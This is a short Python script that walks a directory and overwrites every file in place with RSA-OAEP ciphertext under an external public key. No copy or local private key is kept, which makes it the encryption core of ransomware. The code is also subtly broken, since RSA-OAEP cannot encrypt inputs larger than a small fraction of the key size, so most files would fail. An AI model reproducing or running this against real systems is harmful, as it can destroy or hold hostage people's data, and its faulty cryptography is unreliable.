import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def encrypt_file(file_path, public_key):
    with open(file_path, 'rb') as file:
        content = file.read()
    
    cipher = PKCS1_OAEP.new(public_key)
    encrypted_content = cipher.encrypt(content)
    
    with open(file_path, 'wb') as file:
        file.write(encrypted_content)

def encrypt_all_files(directory, public_key):
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path, public_key)

public_key = RSA.import_key(open('public.pem').read())
encrypt_all_files("/path/to/directory", public_key)
